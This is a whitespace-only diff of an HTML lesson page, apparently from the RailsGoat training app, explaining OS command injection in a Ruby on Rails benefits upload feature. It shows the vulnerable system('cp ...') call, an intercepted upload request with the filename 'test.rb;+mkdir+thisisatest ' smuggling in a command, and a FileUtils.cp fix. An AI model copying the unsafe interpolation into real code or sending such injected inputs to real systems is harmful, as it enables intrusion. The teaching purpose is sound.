@@ -17,8 +17,8 @@
           <div class="accordion-body in collapse" id="collapseNine" style="height: auto;">
             <div class="accordion-inner">
              <p class="desc">
-				An OS command injection attack occurs when an attacker attempts to execute system level commands through a vulnerable application. Applications are considered vulnerable to the OS command injection attack if they utilize user input in a system level command.
-			 </p>
+        An OS command injection attack occurs when an attacker attempts to execute system level commands through a vulnerable application. Applications are considered vulnerable to the OS command injection attack if they utilize user input in a system level command.
+       </p>
             </div>
           </div>
         </div>
@@ -32,50 +32,50 @@
           </div>
           <div class="accordion-body collapse" id="collapseTen" style="height: 0px;">
             <div class="accordion-inner">
-			  <p class="desc">
-				This manifestation of the bug occurs within the Benefits model. A system command is used to make a copy of the file the user has chosen to upload. User-supplied input is leveraged in creating this system command.
-			  </p>
-			  <p>
-				Within app/controllers/benefits_controller.rb:
-			  </p>
-			  <pre class="ruby">
-				  def upload
-				    <span style="background:yellow">file = params[:benefits][:upload]</span>
-				    if file
-				      flash[:success] = "File Successfully Uploaded!"
-				      <span style="background:yellow">Benefits.save(file, params[:benefits][:backup])</span>
-				    else
-				      flash[:error] = "Something went wrong"
-				    end
-				    redirect_to user_benefit_forms_path(:user_id => current_user.user_id)
-				  end
-			  </pre>
-			  <p>
-				Within app/models/benefits.rb:
-			  </p>
-			  <pre class="ruby">
-				class Benefits &lt; ActiveRecord::Base
-				 attr_accessor :backup
+        <p class="desc">
+        This manifestation of the bug occurs within the Benefits model. A system command is used to make a copy of the file the user has chosen to upload. User-supplied input is leveraged in creating this system command.
+        </p>
+        <p>
+        Within app/controllers/benefits_controller.rb:
+        </p>
+        <pre class="ruby">
+          def upload
+            <span style="background:yellow">file = params[:benefits][:upload]</span>
+            if file
+              flash[:success] = "File Successfully Uploaded!"
+              <span style="background:yellow">Benefits.save(file, params[:benefits][:backup])</span>
+            else
+              flash[:error] = "Something went wrong"
+            end
+            redirect_to user_benefit_forms_path(:user_id => current_user.user_id)
+          end
+        </pre>
+        <p>
+        Within app/models/benefits.rb:
+        </p>
+        <pre class="ruby">
+        class Benefits &lt; ActiveRecord::Base
+         attr_accessor :backup
 
-				 def self.save(file, backup=false)
-				   data_path = Rails.root.join("public", "data")
-				   full_file_name = "#{data_path}/#{file.original_filename}"
-				   f = File.open(full_file_name, "w+")
-				   f.write file.read
-				   f.close
-				   make_backup(file, data_path, full_file_name) if backup == "true"
-				 end
+         def self.save(file, backup=false)
+           data_path = Rails.root.join("public", "data")
+           full_file_name = "#{data_path}/#{file.original_filename}"
+           f = File.open(full_file_name, "w+")
+           f.write file.read
+           f.close
+           make_backup(file, data_path, full_file_name) if backup == "true"
+         end
 
-				 def self.make_backup(file, data_path, full_file_name)
-				   system("cp #{full_file_name} #{data_path}/bak#{Time.now.to_i}_#{<span style="background:yellow">file.original_filename</span>}")
-				 end
+         def self.make_backup(file, data_path, full_file_name)
+           system("cp #{full_file_name} #{data_path}/bak#{Time.now.to_i}_#{<span style="background:yellow">file.original_filename</span>}")
+         end
 
-				end
+        end
 
-			  </pre>
-			  <p class="desc">
-				The command injection vulnerability is introduced when the user-supplied input (name of file) is interpolated or mixed in with a system command.
-			  </p>
+        </pre>
+        <p class="desc">
+        The command injection vulnerability is introduced when the user-supplied input (name of file) is interpolated or mixed in with a system command.
+        </p>
             </div>
           </div>
         </div>
@@ -90,54 +90,54 @@
           <div class="accordion-body collapse" id="collapseEleven" style="height: 0px;">
             <div class="accordion-inner">
                <p><b>Command Injection - ATTACK</b></p>
-			   <p class="desc">
-			   	The filename portion of the benefits[upload] parameter is vulnerable to command injection. Navigate to the benefits section of the application, and choose a file to upload. Once the file is chosen, turn your intercepting proxy on, click start upload, and intercept the request. you will want to change the backup option to true (highlighted below) and inject your commands within the filename parameter (highlighted). Note: forward slashes ('/') are escaped by the original_filename method (used to extract the file name ).
-			   </p>
- 			   <pre class='ruby'>
-				POST /upload HTTP/1.1
-				Host: railsgoat.dev
-				User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
-				Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-				Accept-Language: en-US,en;q=0.5
-				Accept-Encoding: gzip, deflate
-				Referer: http://railsgoat.dev/users/5/benefit_forms
-				Cookie: _railsgoat_session=[redacted for brevity]
-				Connection: keep-alive
-				Content-Type: multipart/form-data; boundary=--------54316025
-				Content-Length: 1731
+         <p class="desc">
+          The filename portion of the benefits[upload] parameter is vulnerable to command injection. Navigate to the benefits section of the application, and choose a file to upload. Once the file is chosen, turn your intercepting proxy on, click start upload, and intercept the request. you will want to change the backup option to true (highlighted below) and inject your commands within the filename parameter (highlighted). Note: forward slashes ('/') are escaped by the original_filename method (used to extract the file name ).
+         </p>
+         <pre class='ruby'>
+        POST /upload HTTP/1.1
+        Host: railsgoat.dev
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://railsgoat.dev/users/5/benefit_forms
+        Cookie: _railsgoat_session=[redacted for brevity]
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=--------54316025
+        Content-Length: 1731
 
-				----------54316025
-				Content-Disposition: form-data; name="utf8"
+        ----------54316025
+        Content-Disposition: form-data; name="utf8"
 
-				â
-				----------54316025
-				Content-Disposition: form-data; name="authenticity_token"
+        â
+        ----------54316025
+        Content-Disposition: form-data; name="authenticity_token"
 
-				zKnXZO1PGcM+rFweczO7H8IDQ6NHmc8Siud2ypM6ZeA=
-				----------54316025
-				Content-Disposition: form-data; name="benefits[backup]"
+        zKnXZO1PGcM+rFweczO7H8IDQ6NHmc8Siud2ypM6ZeA=
+        ----------54316025
+        Content-Disposition: form-data; name="benefits[backup]"
 
-				<span style="background:yellow">true</span>
-				----------54316025
-				Content-Disposition: form-data; name="benefits[upload]"; <span style="background:yellow">filename="test.rb;+mkdir+thisisatest "</span>
-				Content-Type: text/x-ruby-script
-			   </pre>
-			   <p><b>Command Injection - SOLUTION</b></p>
-			   <p class="desc">
-				The solution is fairly simple and because this is so poorly done there are numerous ways to fix the vulnerability. One option, is to abstract a file creation method and pass it options such as the path and filename, then call it twice, once for the initial upload and another for the backup. Another option is to make a copy through the use of the FileUtils.
-			   </p>
-			   <p>
-				As an example:
-			   </p>
-			   <pre class="ruby">
-					def self.make_backup(file, data_path, full_file_name)
-					   FileUtils.cp "#{full_file_name}", "#{data_path}/bak#{Time.now.to_i}_#{file.original_filename}"
-					 end
-			   </pre>
+        <span style="background:yellow">true</span>
+        ----------54316025
+        Content-Disposition: form-data; name="benefits[upload]"; <span style="background:yellow">filename="test.rb;+mkdir+thisisatest "</span>
+        Content-Type: text/x-ruby-script
+         </pre>
+         <p><b>Command Injection - SOLUTION</b></p>
+         <p class="desc">
+        The solution is fairly simple and because this is so poorly done there are numerous ways to fix the vulnerability. One option, is to abstract a file creation method and pass it options such as the path and filename, then call it twice, once for the initial upload and another for the backup. Another option is to make a copy through the use of the FileUtils.
+         </p>
+         <p>
+        As an example:
+         </p>
+         <pre class="ruby">
+          def self.make_backup(file, data_path, full_file_name)
+             FileUtils.cp "#{full_file_name}", "#{data_path}/bak#{Time.now.to_i}_#{file.original_filename}"
+           end
+         </pre>
             </div>
           </div>
         </div>
-     	<div class="accordion-group">
+      <div class="accordion-group">
           <div class="accordion-heading">
             <a  style="background-color: rgb(181, 121, 158)" href="#collapseTwelve" data-parent="#accordion1" data-toggle="collapse" class="accordion-toggle">
               <i class="icon-aid icon-white">
@@ -151,6 +151,6 @@
             </div>
           </div>
         </div>
-	 </div>
+   </div>
     </div>
   </div>
